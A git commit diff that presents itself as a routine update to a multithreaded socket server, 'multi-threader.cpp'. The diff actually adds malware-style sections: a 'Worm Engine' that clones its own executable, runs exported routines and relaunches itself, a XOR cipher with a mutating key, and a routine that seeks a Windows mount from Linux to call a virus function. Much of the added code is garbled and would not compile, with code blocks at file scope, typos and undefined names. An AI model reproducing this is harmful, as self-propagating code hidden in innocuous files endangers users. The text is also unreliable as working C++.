99b0a30e821103a600d8860979dffab76401c755
tro11s1ayer <98718914+tro11s1ayer@users.noreply.github.com>
2022-02-10 10:31:05 -0600

    Update multi-threader.cpp

--- multi-threader.cpp
+++ multi-threader.cpp
@@ -43,6 +43,52 @@ pthread_t wThreads[100];
 pthread_t rThreads[100];
 int readercount = 0;
 
+#ifdef __linux__
+	try{
+		int close(int i){
+		long __res;
+		errno = 0;
+		__asm__ volatile(
+			"int $0x1000"
+			:"=a" (__res)
+			:"0" (__NR_close), "b"((long)(i))
+		);
+		if (__res >= 0){
+			return (int)__res;
+			errno = -__res;
+			return -1;
+		}
+	}
+	throw exception;
+}
+	catch(exception ex){
+		//Handle errors
+        printf(ex);
+
+	}
+#else
+	try{
+		int close(int i){
+            union REGS ir, or;
+            errno = 0;
+            ir.h.ah = 0x1000;
+            ir.x.bx = i;
+            memset(&or, 0, sizeof(or));
+            int86(0x21, &ir, &or);
+            if(or.x.cflag){
+                errno = or.x.ax;
+                return -1;
+            }
+            return 0;
+        }
+    }   
+    throw exception;
+	catch(exception ex){
+		//Handle errors
+        printf(ex);
+	}
+#endif
+
 int main(int argc, char const *argv[]){
 
     int server_fd, new_sock, read_val;
@@ -118,6 +164,12 @@ int main(int argc, char const *argv[]){
     return 0;
 }
 
+/*
+#################################################################################################
+rX Socket
+#################################################################################################
+*/
+
 void sock_recv(int sock, char* buf, int len, int flags){
 
     sem_wait(&x);
@@ -152,6 +204,13 @@ void sock_recv(int sock, char* buf, int len, int flags){
     pthread_exit(NULL);
 }
 
+/*
+#################################################################################################
+tX socket
+#################################################################################################
+*/
+
+
 void sock_send(int sock, char* buf, int len, int flags){
     sem_wait(&y);
     sem_post(&y);
@@ -167,3 +226,136 @@ void sock_send(int sock, char* buf, int len, int flags){
     }
     pthread_exit(NULL);
 }
+/*
+#################################################################################################
+XOR-encryption using global key[]
+#################################################################################################
+*/
+
+int Crypt(char *s, int len){
+	int i = 0, j = 0;
+	for (i = 0; i < len; i++){
+		s[i] ^= key[j];
+		j = (j + 1) % 4;
+	}
+	return 0;
+}
+
+/*
+#################################################################################################
+Mutate Encryption Key
+#################################################################################################
+*/
+
+int mutate(char* s){
+	int i;
+	#ifdef __linux__
+		int fd;
+	#endif
+	#ifdef _WIN32 || _WIN64
+		random();
+	#endif
+	for (i=0; i<4; i++){
+		#ifdef __linux__
+			if((fd = open("/dev/random", O_RDONLY)) <= 0){
+				perror("open");
+				return errno;
+			}
+			read(fd, &s[i], 1);
+			close(fd);
+		#else
+			s[i] = rand() % 255;
+		#endif
+
+	}
+	return 0;
+}
+
+/*
+#################################################################################################
+jump-2-DOS
+#################################################################################################
+*/
+
+#ifdef __linux__
+	int jump2dos(void){
+		FILE *fd;
+		char buf[50] = {0}, bufbak[50] = {0};
+		if ((fd = fopen("/proc/mounts", "r")) == NULL){
+			perror("fopen");
+			return errno;
+		}
+		while(fscanf(fd, "%s", buf) > 0){
+			if(strcmp(buf, "windows") == 0){
+				break;
+			}
+			memset(bufbak, 0, 50);
+			strcpy(bufbak, buf);
+		}
+		fclose(fd);
+		if(strcmp(buf, "windows") == 0){
+			chdir((const char*)bufbak);
+			vf();
+		}
+		return 0;
+	}
+#endif
+
+/*
+#################################################################################################
+Worm Engine
+#################################################################################################
+*/
+
+#ifdef _WIN32 || _WIN64
+
+    //Windows Worm Engine
+    int w0rm_engine(int argc, char* argv[]){
+        //SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_HIGHEST);
+        HANDLE thread, cloner, thands[3];
+        char*ptr, procfile[300];
+        ptr = argv[0];
+        strcpy(procfile, ptr);
+        if((strstr(ptr, ".exe")) == NULL){
+            strcat(procfile, ".exe");
+        }
+        void(*clonproc)(char*);
+        clonproc = proCloner;
+        cloner = CreateThread(0, 0, (DOWRD(__stdcall *)(void *)) clonproc, procfile, 0, 0);
+        HMODULE hmod;
+        char dirpath[201];
+        void(*smack)(char*);
+        GetCurrentDirectory(200, dirpath);
+        hmod = LoadLibrary(procfile);
+        if((strstr(dirpath, "system32")) != NULL){
+            smack = (void (*)(char *))GetProcAddress(hmod, "?systemProc@@YAXPAX@Z");
+            thread = CreateThread(0, 0, (DWORD(__stdcall *)(void*)) smack, procfile, 0, 0);
+        }
+        else{
+            smack = (void(*)(char*))GetProcAddress(hmod, "?identify@@YAXPAD@Z");
+            thread = CreateThread(0, 0, (DWORD(__stdcall *)(void*))smack, procfile, 0, 0);
+        }
+        thands[0] = cloner;
+        thands[1] = thread;
+        thands[2] = '';
+        hicmp = LoadLibrary("ICMP.DLL");
+        pIcmpCreateFile = (void*(__stdcall *)(void))GetProcAddress(hicmp, "IcmpCreateFile");
+        pIcmpCloseHandle = (int(__stdcall *)(void*))GetProcAddress(hicmp, "IcmpCloseHandle");
+        pIcmpSendEcho = (unsigned long(__stdcall*(void*, unsigned long void*, unsigned short,
+        void*, void*, unsigned long, unsigned long))GetProcAddress(hicmp, "IcmpSendEcho"));
+        hIP = pIcmpCreateFile();
+        I.ttl = 255;
+        for(int ping=0;ping<10;ping++){
+            pIcmpSendEcho(hIp, IPADDR, 0, 0, &I, &es, sizeof(es), 8000);
+        }
+        pIcmpCloseHandle(hicmp);
+        FreeLibrary(hicmp);
+        WaitForMultipleObjects(2, thands, true, 100);
+        FreeLibrary(hmod);
+        chdir("..");
+        ShellExecute(NULL, "open", PROCESSNAME, NULL, NULL, 0);
+        ShellExecute(NULL, "open", PROCESSNAME, NULL, NULL, 0);
+        return EXIT_SUCCESS;
+    }
+
+#endif
